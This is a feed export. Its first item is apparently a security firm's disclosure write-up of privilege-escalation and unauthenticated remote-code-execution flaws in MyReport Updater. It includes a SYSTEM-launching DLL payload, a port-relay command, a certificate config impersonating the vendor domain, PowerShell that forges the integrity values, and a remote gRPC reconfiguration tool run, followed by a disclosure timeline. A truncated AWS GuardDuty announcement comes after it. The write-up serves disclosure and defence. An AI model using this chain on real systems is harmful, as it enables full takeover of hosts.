items.title: MyReport Updater: From gRPC to SYSTEM
items.summary: Introduction During an assumed breach assessment, we were in a position where we had to find a way to elevate our privileges on a Citrix server. And what's the easiest way to do that on an up-to-date server? Find a Windows 0day with Claude Take a look at third-party applications running on the target! The application "My Report Updater" quickly got our attention: a user-level manager communicates over gRPC with a service running as LocalSystem . A service that downloads modules and writes them to disk. This is a good place to look for bugs. I reviewed version 2.1.1 in a Windows environment. The service accepted gRPC requests on TCP port 9095 . The manager could select a reference server and an installation directory. I ended up with the following chain: Point "MyReport Updater" at an attacker-controlled reference server. Provide a modified "MyReport module" archive. Return the MD5 value and file size expected for that modified archive. Ask the LocalSystem service to install the archive in a chosen directory. Place a DLL where a privileged process loads it. The result in the tested environment was code execution as NT AUTHORITY\SYSTEM . While testing the chain, I found that the gRPC service listened on all interfaces and I could call its UpdateConfigReferent method from another host without authentication. The request changed the reference host, port, and operating mode of the target. This post goes through findings and exploitation for both LPE and RCE vulnerabilities. TLDR: An LPE and an unauthenticated RCE have been found. Pre-requisites for RCE are network access to TCP port 9095 and egress traffic from the updater to the attacker-controlled infrastructure. Description MyReport is a Business Intelligence platform that centralizes data, automates reporting, and creates dashboards for analysis and decision-making. It was installed in Managed mode on the Citrix server available during the assessment. The solution includes the main software, an updater, and several modules. The modules can be installed with MyReport Updater . The official description of MyReport Updater states that its goal is to make MyReport deployment and updates easier. It contains: a Windows service named MyReportUpdaterService , running as LocalSystem ; an Updater Manager application used to control the service from a GUI or command line; a MyReport Updater.msi file used to install these components. The analysis showed that UpdaterManager.exe communicates with MyReportUpdaterService over gRPC on TCP port 9095 . The configuration can be changed to use any reference server. This server contacts the MyReport servers and forwards updates. MyReport Updater architecture in Managed mode. Impact An attacker with standard user privileges can set an arbitrary reference server. If MyReportUpdaterService can contact this server over gRPC on TCP port 9095 , the attacker can write files into a chosen directory with NT AUTHORITY\SYSTEM privileges. The attacker can use this file-write access to place a DLL that will be loaded by a privileged process. The DLL code is then executed with high privileges. This vulnerability gives full control of the Citrix server. It can also affect other machines where the vulnerable MyReport solution is installed. SYSTEM is the highest local privilege level on Windows. Exploitation We created a proof of concept on the Citrix server. The proof changes the reference server to one controlled by the attacker, bypasses the integrity checks for downloaded files, and writes files into an arbitrary directory. The proof was developed and tested against "MyReport Updater" version 2.1.1 . Updater Manager version. We first installed MyReport in a local virtual machine. This allowed us to monitor the actions performed by the solution. The MyReportUpdaterService service runs as LocalSystem , also displayed as NT AUTHORITY\SYSTEM on an English Windows system. The service runs as NT AUTHORITY\SYSTEM. The service listens on TCP port 9095 . The service listens on TCP port 9095. The UpdaterManager.exe and UpdaterManagerDesktop.exe processes communicate with TCP port 9095 . Network traffic between the updater and the service. Wireshark identified the traffic as gRPC. gRPC traffic identified with Wireshark. The UpdaterService.exe process communicates over TCP port 443 . TLS requests contain the updater.myreport.fr domain in the Server Name Indication field. TLS packet containing updater.myreport.fr in the SNI field. These observations show that programs running with standard privileges communicate with a service running with high privileges. The service also sends HTTPS requests to a vendor server. Module installation actions are started from UpdaterManager.exe , but the service downloads the files and writes them to the system. The service installs the module files. The following programs communicate with the privileged service: C:\Program Files (x86)\MyReport\MyReport Updater\manager\UpdaterManagerDesktop.exe , the GUI; C:\Program Files (x86)\MyReport\MyReport Updater\manager\UpdaterManager.exe , the CLI. The CLI provides more features than the GUI. For example, it can change the client mode to Referent , Customized , Managed , or UnManaged . This changes how installation packages are retrieved. This feature is restricted in the GUI, but not in the CLI. Changing the configuration and reference server. The exploitation scenario is: Change the reference server on the Citrix machine to a server controlled by the attacker. Download and modify the MyReport installation files. Serve updates containing arbitrary code. Internet traffic to TCP port 9095 was blocked in the tested environment. Internal traffic to this port was not blocked. We could run commands on the internal machine XXXXXX29 , so we used it as a relay with this rule: netsh interface portproxy add v4tov4 listenport = 9095 listenaddress = 192.168.23.180 connectport = 80 connectaddress = X . X . X . X All traffic received on TCP port 9095 of the relay was forwarded to a server controlled by us on TCP port 80 . This traffic was then forwarded again to a virtual machine running MyReport in Referent mode. Internet traffic to TCP ports 80 and 443 was allowed from the relay machine. The MyReport configuration was changed to replace the existing reference server with the relay machine. At this point, no option was available to change the reference-server port, so the relay was required. The port was changed later with a custom gRPC request. This is described in Remote code execution . That method removes the need for the internal relay and bypasses the internal firewall restriction used in the first proof. The reference server was changed to the relay machine. We then downloaded the ZIP archives containing the MyReport modules. PS C :\ ProgramData \ MyReport \ Updater \ Downloaded > updatermanager . exe add - -products administrator - -version 6 . 0 . 0 - -serverPlatform x64 PS C :\ ProgramData \ MyReport \ Updater \ Downloaded > dir * 6 . 0 . 0 * Directory : C :\ ProgramData \ MyReport \ Updater \ Downloaded Mode LastWriteTime Length Name ---- ------------- ------ ---- -a ---- 10 / 20 / 2025 5 : 56 PM 90624414 Administrator . 6 . 0 . 0 . AnyCPU . zip -a ---- 10 / 20 / 2025 4 : 59 PM 213382345 Server . 6 . 0 . 0 . x86 . zip We modified Administrator.6.0.0.AnyCPU.zip and added HID.dll at the root of the archive. The payload was added to the ZIP archive. When loaded, the DLL checks whether the current user is NT AUTHORITY\SYSTEM by comparing its SID. If the check succeeds, it starts cmd.exe . // Launches cmd.exe if loaded into a process running as SYSTEM. #include "pch.h" #include void DoIt () { HANDLE hToken = GetCurrentProcessToken (); DWORD infoSize ; GetTokenInformation ( hToken , TokenUser , NULL , 0 , & infoSize ); auto buffer = std :: make_unique < char [] > ( infoSize ); if ( ! GetTokenInformation ( hToken , TokenUser , buffer . get (), infoSize , & infoSize )) { return ; } _TOKEN_USER * tokenUser = ( _TOKEN_USER * ) buffer . get (); if ( ! IsWellKnownSid ( tokenUser -> User . Sid , WinLocalSystemSid )) { return ; } STARTUPINFO startupInfo ; memset ( & startupInfo , 0 , sizeof ( startupInfo )); PROCESS_INFORMATION processInfo ; memset ( & processInfo , 0 , sizeof ( processInfo )); wchar_t commandLine [] = L "cmd.exe" ; if ( ! CreateProcess ( NULL , commandLine , NULL , NULL , FALSE , 0 , NULL , NULL , & startupInfo , & processInfo )) { return ; } } BOOL APIENTRY DllMain ( HMODULE hModule , DWORD ul_reason_for_call , LPVOID lpReserved ) { switch ( ul_reason_for_call ) { case DLL_PROCESS_ATTACH : DoIt (); break ; case DLL_THREAD_ATTACH : case DLL_THREAD_DETACH : case DLL_PROCESS_DETACH : break ; } return TRUE ; } The goal was to write the DLL to: C:\Program Files\Common Files\microsoft shared\ink osk.exe , the Windows On-Screen Keyboard, loads this DLL. The program is available from the secure desktop opened with Ctrl+Alt+Delete . It is started by WinLogon with NT AUTHORITY\SYSTEM privileges. The reference server performs an integrity check using the MD5 digest and size of Administrator.6.0.0.AnyCPU.zip . This information is then returned to the updater. The gRPC requests sent by the reference server to updater.myreport.fr show how these values are retrieved. Retrieving information for the integrity check. The decompiled code of MyUpdaterService.RPC.Client.dll confirms that these checks are present. Fields in the ProductInformation class. Traffic to updater.myreport.fr was intercepted on the reference server controlled by us. It was redirected to a tool created during the assessment . This tool returned the correct MD5 digest and size for the modified archives. The tool worked as a gRPC and TLS man-in-the-middle server. It forwarded requests to the vendor server and modified the responses. It ran on another server. The /etc/hosts file on the reference server was changed so that updater.myreport.fr resolved to the address of the gRPC tool. Traffic for updater.myreport.fr was redirected to the gRPC tool. The updater could not connect to the gRPC tool with a self-signed certificate. It returned this error: The remote certificate is invalid according to the validation procedure: RemoteCertificateNameMismatch, RemoteCertificateChainErrors Source: System.Private.CoreLib Exception type: System.Security.Authentication.AuthenticationException The error showed a problem with the domain names in the certificate. We reproduced the certificate information from updater.myreport.fr and used it with the gRPC tool. A certificate can also be generated for Nginx with the following configuration: tee /etc/nginx/certs/myreport.cnf > /dev/null <<'EOF' [ req ] default_bits = 2048 prompt = no default_md = sha256 req_extensions = req_ext distinguished_name = dn [ dn ] C = FR O = MyReport Local Proxy CN = *.myreport.fr [ req_ext ] subjectAltName = @alt_names [ alt_names ] DNS.1 = *.myreport.fr DNS.2 = myreport.fr [ v3_ca ] subjectKeyIdentifier = hash authorityKeyIdentifier = keyid:always,issuer basicConstraints = CA:TRUE EOF The updater expects the MD5 digest and file size in a specific format. The following PowerShell commands, also available in get_hash_and_size.ps1 , generate these values: $f = "C:\ProgramData\MyReport\Updater\Downloaded\Administrator.6.0.0.AnyCPU.zip" Write-Host "### Hash ###" [Convert] :: ToBase64String ( [byte[]] ( -join (( Get-FileHash $f -Algorithm MD5 ). Hash -split '(..)' | Where-Object { $_ } | ForEach -Object { [char][Convert] :: ToByte ( $_ , 16 )})). ToCharArray ()) Write-Host "### Size ###" $s =( Get-Item $f ). Length ; -join ($( while ( $s -gt0x7F ){ [byte] (( $s -band0x7F ) -bor0x80 ); $s = $s -shr7 }; [byte] ( $s -band0x7F ))|%{ '\x{0:x2}' -f $_ }) The result for the modified archive was: ### Hash ### gIYMdbsrrZZx+ntRYhDu2g== ### Size ### \x9e\xa3\x9b\x2b After obtaining the integrity-check values, we started the module installation with this command: UpdaterManager.exe add --installLocation "C:\Program Files\Common Files\microsoft shared\ink" --products Administrator --version 6.0.0 --serverPlatform x64 --NoInstallIIS --force The gRPC man-in-the-middle tool received the responses from updater.myreport.fr . It replaced the MD5 digest and file size before returning the responses to the reference server. The responses from updater.myreport.fr were modified. At the end of the installation, the following file was present on the Citrix machine: C:\Program Files\Common Files\microsoft shared\ink\HID.dll We pressed Ctrl+Alt+Delete to open the secure desktop. We then selected the On-Screen Keyboard from the options in the lower-right corner. The DLL was loaded and a command prompt opened with NT AUTHORITY\SYSTEM privileges. Command prompt running as NT AUTHORITY\SYSTEM. Remote code execution We later found that a custom gRPC request could remotely change the configuration mode of a machine running "MyReport Updater". A Python script, grpcmanual.py , was created to automate this request. The target machine used in this test had the IP address 172.16.200.134 . Initial configuration of the target machine. From another machine, the attacker can remotely change the mode, port, and address used by the target. $ python3 grpcmanual.py -h usage: grpcmanual.py [-h] [--target TARGET] [--target-port TARGET_PORT] --host HOST --port PORT [--mode {0,1,2,3}] UpdateConfigReferent via gRPC options: -h, --help show this help message and exit --target TARGET --target-port TARGET_PORT --host HOST --port PORT --mode {0,1,2,3} 0: Customized, 1: Managed, 2: UnManaged, 3: Referent The host address in the following command is only an example. It confirms that the mode, address, and port are changed on the target. $ python3 grpcmanual.py --host 8.8.8.8 --port 443 --mode 1 --target 172.16.200.134 [+] Configuration: - Target: 172.16.200.134:9095 - Host: 8.8.8.8 - Port: 443 - Mode: Managed [+] Message (18 bytes): 0a100a090a07382e382e382e3810bb031801 [+] SUCCÈS! [+] Réponse (56 bytes): 12360a090a07382e382e382e3810bb031801222464333535333066372d326637332d343731662d623030302d346632326632383234663431 The target configuration was changed remotely. The previous demonstrated LPE vulnerability can therefore be exploited remotely. It allows unauthenticated remote code execution with SYSTEM privileges. Disclosure timeline Below we include a timeline of the relevant events during the coordinated vulnerability disclosure process with the intent of providing transparency to the whole process and our actions. This list is not exhaustive. 2025-11-04: Quarkslab was contacted by MyReport requesting information about a vulnerability we reported to a mutual customer. A conference call is held to discuss the matter. 2025-11-05: Quarkslab notifed MyReport that a technical report was being prepared. MyReport provided a GPG public key to encrypt the report. 2025-11-12: Quarkslab sent the technical report and asked the vendor to acknowledge it. 2025-11-20: Quarkslab asked for confirmation that the report was received and could be read. 2025-12-08: Quarkslab asked for an update. 2025-12-09: Quarkslab informed the vendor that a 90-day embargo period would be set and asked for a timeline for producing a fix, validate it and public release. 2026-02-06: Quarkslab requested an update and informed the vendor that in absence of response the report will be forwarded to CERT-FR to coordinate disclosure with them in order to inform affected users. 2026-02-06: Our mutual customer indicated that the vulnerability should be disclosed since it is exploitable and users are at risk. 2026-02-09: MyReport acknowledged the technical report and said their engineers were working on a comprehensive analysis of the problem. Their goal was to provide a response before March 8th and said that they would contact Quarkslab if they needed further information. 2026-02-16: MyReport asked to organize a meeting to present and discuss their action plan. 2026-02-24: Quarkslab proposed dates and times for a meeting with the vendor and our mutual customer. Our mutual customer delegated follow up to Quarkslab. 2026-03-03: Videoconference between Quarkslab and MyReport to coordinate the action plan. 2026-03-18: Quarkslab notified the vendor that we have not received a timeline for the fixes, as agreed in the past videoconference. 2026-03-19: MyReport indicated that the timeline would be sent the next week. Signing of the update packages was being finished. 2026-03-30: Quarkslab sent email to MyReport indicating that over the past 4 months we've repeatedly requested a remediation roadmap, which the vendor commited to provide but did not deliver. The original 90-day embargo period had expired and our mutual customer remained exposed. Told the vendor that CERT-FR would be notified and the disclosure date was set to April 3th, 2026. If, by then, the vendor provided a roadmap with firm delivery dates the disclosure date could be reconsidered. 2026-04-02: MyReport replied with a remediation roadmap that included release of fixes at the end of Q2-2026 and re-architecture of the service and release of the new architecture at the end of Q3-2026. Quarkslab agreed to postpone publication to end of Q2-2026. 2026-07-09: To coordinate diclosure to potentially affected users, Quarkslab contacted CERT-FR and provided the technical report and a summary of the disclosure timeline so far. 2026-07-21: CERT-FR acknowledged the report and requested a brief summary of the discussion with the vendor so far and some information about the circunstances of the discovery of the vulnerability. 2026-08-03: Quarkslab sent the requested information to CERT-FR and notified them that the vendor provided a roadmap for fixes in April and that Quarkslab had prepared a blog post describing the vulnerability. 2026-08-03: CERT-FR acknowledged the information provided by Quarkslab and requested further details about the vendor's roadmap, asked for the vendor's point of contact and indicated we should continue coordinating with the vendor but keep them informed. 2026-08-11: Quarkslab informed CERT-FR of the prior communications with MyReport, provided their point of contact and explained they are a french vendor whose software is used by their customers and other vendors. Noted that disclosure was now planed for early September and said dissemination of the information within a reasonable timeframe was important. 2026-08-11: Quarkslab sent email to MyReport saying the end of Q2 deadline for the release of fixes passed and we had not received any notification about it. Notified them that CERT-FR was informed of the vulnerability and requested information about release of patches, affected and fixed versions and their deployment schedule. 2026-08-17: CERT-FR acknowledged our last email and indicated they were aligned with the coordinated process so far. 2026-08-24: CERT-FR contacted the vendor and asked for an update on the remediation process. 2026-09-10: MyReport replied with a new designated point of contact for the coordination and provided an update on the remediation plan. Three tasks were already completed and another one was being implemented. The release of fixes was planed for "mid October". 2026-09-10: Quarkslab asked if there was a specific date for the "mid October" release and if customers would be notified of it with a security advisory or any other security-specific communication. 2026-09-14: MyReport informed that the new release was scheduled to October 13th, 2026 and the security fixes would be informed in the Release Notes. 2026-10-02: CERT-FR acknowledged receiving the communication from MyReport and asked Quarkslab for our publication date. 2026-10-13: This blogpost is published. References MyReport Updater documentation Updater Manager documentation Wireshark Create a self-signed certificate for Nginx
items.summary_html:
Introduction

During an assumed breach assessment, we were in a position where we had to find a way to elevate our privileges on a Citrix server. And what's the easiest way to do that on an up-to-date server? Find a Windows 0day with Claude Take a look at third-party applications running on the target!

The application "My Report Updater" quickly got our attention: a user-level manager communicates over gRPC with a service running as LocalSystem. A service that downloads modules and writes them to disk. This is a good place to look for bugs.

I reviewed version 2.1.1 in a Windows environment. The service accepted gRPC requests on TCP port 9095. The manager could select a reference server and an installation directory.

I ended up with the following chain:

  1. Point "MyReport Updater" at an attacker-controlled reference server.
  2. Provide a modified "MyReport module" archive.
  3. Return the MD5 value and file size expected for that modified archive.
  4. Ask the LocalSystem service to install the archive in a chosen directory.
  5. Place a DLL where a privileged process loads it.

The result in the tested environment was code execution as NT AUTHORITY\SYSTEM.

While testing the chain, I found that the gRPC service listened on all interfaces and I could call its UpdateConfigReferent method from another host without authentication. The request changed the reference host, port, and operating mode of the target.

This post goes through findings and exploitation for both LPE and RCE vulnerabilities.

TLDR: An LPE and an unauthenticated RCE have been found. Pre-requisites for RCE are network access to TCP port 9095 and egress traffic from the updater to the attacker-controlled infrastructure.

Description

MyReport is a Business Intelligence platform that centralizes data, automates reporting, and creates dashboards for analysis and decision-making. It was installed in Managed mode on the Citrix server available during the assessment. The solution includes the main software, an updater, and several modules. The modules can be installed with MyReport Updater.

The official description of MyReport Updater states that its goal is to make MyReport deployment and updates easier. It contains:

  • a Windows service named MyReportUpdaterService, running as LocalSystem;
  • an Updater Manager application used to control the service from a GUI or command line;
  • a MyReport Updater.msi file used to install these components.

The analysis showed that UpdaterManager.exe communicates with MyReportUpdaterService over gRPC on TCP port 9095. The configuration can be changed to use any reference server. This server contacts the MyReport servers and forwards updates.


MyReport Updater architecture in Managed mode.

Impact

An attacker with standard user privileges can set an arbitrary reference server. If MyReportUpdaterService can contact this server over gRPC on TCP port 9095, the attacker can write files into a chosen directory with NT AUTHORITY\SYSTEM privileges.

The attacker can use this file-write access to place a DLL that will be loaded by a privileged process. The DLL code is then executed with high privileges.

This vulnerability gives full control of the Citrix server. It can also affect other machines where the vulnerable MyReport solution is installed. SYSTEM is the highest local privilege level on Windows.

Exploitation

We created a proof of concept on the Citrix server. The proof changes the reference server to one controlled by the attacker, bypasses the integrity checks for downloaded files, and writes files into an arbitrary directory.

The proof was developed and tested against "MyReport Updater" version 2.1.1.


Updater Manager version.

We first installed MyReport in a local virtual machine. This allowed us to monitor the actions performed by the solution.

The MyReportUpdaterService service runs as LocalSystem, also displayed as NT AUTHORITY\SYSTEM on an English Windows system.


The service runs as NT AUTHORITY\SYSTEM.

The service listens on TCP port 9095.


The service listens on TCP port 9095.

The UpdaterManager.exe and UpdaterManagerDesktop.exe processes communicate with TCP port 9095.


Network traffic between the updater and the service.

Wireshark identified the traffic as gRPC.


gRPC traffic identified with Wireshark.

The UpdaterService.exe process communicates over TCP port 443. TLS requests contain the updater.myreport.fr domain in the Server Name Indication field.


TLS packet containing updater.myreport.fr in the SNI field.

These observations show that programs running with standard privileges communicate with a service running with high privileges. The service also sends HTTPS requests to a vendor server.

Module installation actions are started from UpdaterManager.exe, but the service downloads the files and writes them to the system.


The service installs the module files.

The following programs communicate with the privileged service:

  • C:\Program Files (x86)\MyReport\MyReport Updater\manager\UpdaterManagerDesktop.exe, the GUI;
  • C:\Program Files (x86)\MyReport\MyReport Updater\manager\UpdaterManager.exe, the CLI.

The CLI provides more features than the GUI. For example, it can change the client mode to Referent, Customized, Managed, or UnManaged. This changes how installation packages are retrieved. This feature is restricted in the GUI, but not in the CLI.


Changing the configuration and reference server.

The exploitation scenario is:

  1. Change the reference server on the Citrix machine to a server controlled by the attacker.
  2. Download and modify the MyReport installation files.
  3. Serve updates containing arbitrary code.

Internet traffic to TCP port 9095 was blocked in the tested environment. Internal traffic to this port was not blocked. We could run commands on the internal machine XXXXXX29, so we used it as a relay with this rule:

netsh interface portproxy add v4tov4 listenport=9095 listenaddress=192.168.23.180 connectport=80 connectaddress=X.X.X.X

All traffic received on TCP port 9095 of the relay was forwarded to a server controlled by us on TCP port 80. This traffic was then forwarded again to a virtual machine running MyReport in Referent mode.

Internet traffic to TCP ports 80 and 443 was allowed from the relay machine.

The MyReport configuration was changed to replace the existing reference server with the relay machine. At this point, no option was available to change the reference-server port, so the relay was required.

The port was changed later with a custom gRPC request. This is described in Remote code execution. That method removes the need for the internal relay and bypasses the internal firewall restriction used in the first proof.


The reference server was changed to the relay machine.

We then downloaded the ZIP archives containing the MyReport modules.

We modified Administrator.6.0.0.AnyCPU.zip and added HID.dll at the root of the archive.


The payload was added to the ZIP archive.

When loaded, the DLL checks whether the current user is NT AUTHORITY\SYSTEM by comparing its SID. If the check succeeds, it starts cmd.exe.

// Launches cmd.exe if loaded into a process running as SYSTEM.

#include "pch.h"
#include 

void DoIt()
{
    HANDLE hToken = GetCurrentProcessToken();
    DWORD infoSize;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &infoSize);
    auto buffer = std::make_unique<char[]>(infoSize);
    if (!GetTokenInformation(hToken, TokenUser, buffer.get(), infoSize, &infoSize))
    {
        return;
    }
    _TOKEN_USER* tokenUser = (_TOKEN_USER*)buffer.get();
    if (!IsWellKnownSid(tokenUser->User.Sid, WinLocalSystemSid))
    {
        return;
    }

    STARTUPINFO startupInfo;
    memset(&startupInfo, 0, sizeof(startupInfo));
    PROCESS_INFORMATION processInfo;
    memset(&processInfo, 0, sizeof(processInfo));
    wchar_t commandLine[] = L"cmd.exe";
    if (!CreateProcess(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
    {
        return;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DoIt();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

The goal was to write the DLL to:

C:\Program Files\Common Files\microsoft shared\ink

osk.exe, the Windows On-Screen Keyboard, loads this DLL. The program is available from the secure desktop opened with Ctrl+Alt+Delete. It is started by WinLogon with NT AUTHORITY\SYSTEM privileges.

The reference server performs an integrity check using the MD5 digest and size of Administrator.6.0.0.AnyCPU.zip. This information is then returned to the updater. The gRPC requests sent by the reference server to updater.myreport.fr show how these values are retrieved.


Retrieving information for the integrity check.

The decompiled code of MyUpdaterService.RPC.Client.dll confirms that these checks are present.


Fields in the ProductInformation class.

Traffic to updater.myreport.fr was intercepted on the reference server controlled by us. It was redirected to a tool created during the assessment. This tool returned the correct MD5 digest and size for the modified archives.

The tool worked as a gRPC and TLS man-in-the-middle server. It forwarded requests to the vendor server and modified the responses. It ran on another server. The /etc/hosts file on the reference server was changed so that updater.myreport.fr resolved to the address of the gRPC tool.


Traffic for updater.myreport.fr was redirected to the gRPC tool.

The updater could not connect to the gRPC tool with a self-signed certificate. It returned this error:

The remote certificate is invalid according to the validation procedure:
RemoteCertificateNameMismatch, RemoteCertificateChainErrors
Source: System.Private.CoreLib
Exception type: System.Security.Authentication.AuthenticationException

The error showed a problem with the domain names in the certificate. We reproduced the certificate information from updater.myreport.fr and used it with the gRPC tool. A certificate can also be generated for Nginx with the following configuration:

tee /etc/nginx/certs/myreport.cnf > /dev/null <<'EOF'

[ req ]
default_bits       = 2048
prompt             = no
default_md         = sha256
req_extensions     = req_ext
distinguished_name = dn

[ dn ]
C = FR
O = MyReport Local Proxy
CN = *.myreport.fr

[ req_ext ]
subjectAltName = @alt_names

[ alt_names ]
DNS.1 = *.myreport.fr
DNS.2 = myreport.fr

[ v3_ca ]
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always,issuer
basicConstraints = CA:TRUE
EOF

The updater expects the MD5 digest and file size in a specific format. The following PowerShell commands, also available in get_hash_and_size.ps1, generate these values:

$f = "C:\ProgramData\MyReport\Updater\Downloaded\Administrator.6.0.0.AnyCPU.zip"

Write-Host "### Hash ###"
[Convert]::ToBase64String([byte[]](-join ((Get-FileHash $f -Algorithm MD5).Hash -split '(..)' | Where-Object {$_} | ForEach-Object {[char][Convert]::ToByte($_,16)})).ToCharArray())

Write-Host "### Size ###"
$s=(Get-Item $f).Length;-join ($(while($s-gt0x7F){[byte](($s-band0x7F)-bor0x80);$s=$s-shr7};[byte]($s-band0x7F))|%{'\x{0:x2}'-f$_})

The result for the modified archive was:

### Hash ###
gIYMdbsrrZZx+ntRYhDu2g==

### Size ###
\x9e\xa3\x9b\x2b

After obtaining the integrity-check values, we started the module installation with this command:

UpdaterManager.exe add --installLocation "C:\Program Files\Common Files\microsoft shared\ink" --products Administrator --version 6.0.0 --serverPlatform x64 --NoInstallIIS --force

The gRPC man-in-the-middle tool received the responses from updater.myreport.fr. It replaced the MD5 digest and file size before returning the responses to the reference server.


The responses from updater.myreport.fr were modified.

At the end of the installation, the following file was present on the Citrix machine:

C:\Program Files\Common Files\microsoft shared\ink\HID.dll

We pressed Ctrl+Alt+Delete to open the secure desktop. We then selected the On-Screen Keyboard from the options in the lower-right corner. The DLL was loaded and a command prompt opened with NT AUTHORITY\SYSTEM privileges.


Command prompt running as NT AUTHORITY\SYSTEM.

Remote code execution

We later found that a custom gRPC request could remotely change the configuration mode of a machine running "MyReport Updater". A Python script, grpcmanual.py, was created to automate this request.

The target machine used in this test had the IP address 172.16.200.134.


Initial configuration of the target machine.

From another machine, the attacker can remotely change the mode, port, and address used by the target.

$ python3 grpcmanual.py -h
usage: grpcmanual.py [-h] [--target TARGET] [--target-port TARGET_PORT] --host HOST --port PORT [--mode {0,1,2,3}]

UpdateConfigReferent via gRPC

options:
  -h, --help            show this help message and exit
  --target TARGET
  --target-port TARGET_PORT
  --host HOST
  --port PORT
  --mode {0,1,2,3}      0: Customized, 1: Managed, 2: UnManaged, 3: Referent

The host address in the following command is only an example. It confirms that the mode, address, and port are changed on the target.

$ python3 grpcmanual.py --host 8.8.8.8 --port 443 --mode 1 --target 172.16.200.134
[+] Configuration:
 - Target: 172.16.200.134:9095
 - Host: 8.8.8.8
 - Port: 443
 - Mode: Managed
[+] Message (18 bytes): 0a100a090a07382e382e382e3810bb031801
[+] SUCCÈS!
[+] Réponse (56 bytes): 12360a090a07382e382e382e3810bb031801222464333535333066372d326637332d343731662d623030302d346632326632383234663431


The target configuration was changed remotely.

The previous demonstrated LPE vulnerability can therefore be exploited remotely. It allows unauthenticated remote code execution with SYSTEM privileges.

Disclosure timeline

Below we include a timeline of the relevant events during the coordinated vulnerability disclosure process with the intent of providing transparency to the whole process and our actions. This list is not exhaustive.

  • 2025-11-04: Quarkslab was contacted by MyReport requesting information about a vulnerability we reported to a mutual customer. A conference call is held to discuss the matter.
  • 2025-11-05: Quarkslab notifed MyReport that a technical report was being prepared. MyReport provided a GPG public key to encrypt the report.
  • 2025-11-12: Quarkslab sent the technical report and asked the vendor to acknowledge it.
  • 2025-11-20: Quarkslab asked for confirmation that the report was received and could be read.
  • 2025-12-08: Quarkslab asked for an update.
  • 2025-12-09: Quarkslab informed the vendor that a 90-day embargo period would be set and asked for a timeline for producing a fix, validate it and public release.
  • 2026-02-06: Quarkslab requested an update and informed the vendor that in absence of response the report will be forwarded to CERT-FR to coordinate disclosure with them in order to inform affected users.
  • 2026-02-06: Our mutual customer indicated that the vulnerability should be disclosed since it is exploitable and users are at risk.
  • 2026-02-09: MyReport acknowledged the technical report and said their engineers were working on a comprehensive analysis of the problem. Their goal was to provide a response before March 8th and said that they would contact Quarkslab if they needed further information.
  • 2026-02-16: MyReport asked to organize a meeting to present and discuss their action plan.
  • 2026-02-24: Quarkslab proposed dates and times for a meeting with the vendor and our mutual customer. Our mutual customer delegated follow up to Quarkslab.
  • 2026-03-03: Videoconference between Quarkslab and MyReport to coordinate the action plan.
  • 2026-03-18: Quarkslab notified the vendor that we have not received a timeline for the fixes, as agreed in the past videoconference.
  • 2026-03-19: MyReport indicated that the timeline would be sent the next week. Signing of the update packages was being finished.
  • 2026-03-30: Quarkslab sent email to MyReport indicating that over the past 4 months we've repeatedly requested a remediation roadmap, which the vendor commited to provide but did not deliver. The original 90-day embargo period had expired and our mutual customer remained exposed. Told the vendor that CERT-FR would be notified and the disclosure date was set to April 3th, 2026. If, by then, the vendor provided a roadmap with firm delivery dates the disclosure date could be reconsidered.
  • 2026-04-02: MyReport replied with a remediation roadmap that included release of fixes at the end of Q2-2026 and re-architecture of the service and release of the new architecture at the end of Q3-2026. Quarkslab agreed to postpone publication to end of Q2-2026.
  • 2026-07-09: To coordinate diclosure to potentially affected users, Quarkslab contacted CERT-FR and provided the technical report and a summary of the disclosure timeline so far.
  • 2026-07-21: CERT-FR acknowledged the report and requested a brief summary of the discussion with the vendor so far and some information about the circunstances of the discovery of the vulnerability.
  • 2026-08-03: Quarkslab sent the requested information to CERT-FR and notified them that the vendor provided a roadmap for fixes in April and that Quarkslab had prepared a blog post describing the vulnerability.
  • 2026-08-03: CERT-FR acknowledged the information provided by Quarkslab and requested further details about the vendor's roadmap, asked for the vendor's point of contact and indicated we should continue coordinating with the vendor but keep them informed.
  • 2026-08-11: Quarkslab informed CERT-FR of the prior communications with MyReport, provided their point of contact and explained they are a french vendor whose software is used by their customers and other vendors. Noted that disclosure was now planed for early September and said dissemination of the information within a reasonable timeframe was important.
  • 2026-08-11: Quarkslab sent email to MyReport saying the end of Q2 deadline for the release of fixes passed and we had not received any notification about it. Notified them that CERT-FR was informed of the vulnerability and requested information about release of patches, affected and fixed versions and their deployment schedule.
  • 2026-08-17: CERT-FR acknowledged our last email and indicated they were aligned with the coordinated process so far.
  • 2026-08-24: CERT-FR contacted the vendor and asked for an update on the remediation process.
  • 2026-09-10: MyReport replied with a new designated point of contact for the coordination and provided an update on the remediation plan. Three tasks were already completed and another one was being implemented. The release of fixes was planed for "mid October".
  • 2026-09-10: Quarkslab asked if there was a specific date for the "mid October" release and if customers would be notified of it with a security advisory or any other security-specific communication.
  • 2026-09-14: MyReport informed that the new release was scheduled to October 13th, 2026 and the security fixes would be informed in the Release Notes.
  • 2026-10-02: CERT-FR acknowledged receiving the communication from MyReport and asked Quarkslab for our publication date.
  • 2026-10-13: This blogpost is published.

items.title: GuardDuty Extended Threat Detection has added five new indicators to surface attack sequences
items.summary: Amazon GuardDuty Extended Threat Detection correlates weak GuardDuty signals into a single, critical-severity attack sequence finding when their composition crosses a threshold of credibility. On May 20, 2026, the service started attaching five new indicator types to those sequences: MALICIOUS_PACKAGE , MISCONFIGURATION , REACHABILITY , SENSITIVE_DATA , and VULNERABILITY . For more information, see Document history for Amazon GuardDuty and Attack sequence finding details . These indicators come from Amazon Inspector , Amazon Virtual Private Cloud (Amazon VPC) Reachability Analyzer , Amazon Macie , and posture data surfaced through AWS Security Hub . You might already run these services for other reasons, and now Extended Threat Detection folds their signals into attack sequence findings. This post is an operational guide for teams already running the prerequisite services and discusses what the new indicators look like in a finding, what the post-launch data shows, and how to fold them into your incident-response workflow. These indicators help Extended Threat Detection prioritize the highest-priority signals in your account, which provides higher confidence findings on the workload surfaces as part of an active defense strategy monitoring runtime activity on Amazon Elastic Compute Cloud (Amazon EC2) , Amazon Elastic Container Service (Amazon ECS) , and Amazon Elastic Kubernetes Service (Amazon EKS) . New indicators overview In GuardDuty, a signal is any event it evaluates when looking for suspicious activity. A weak signal is one that, on its 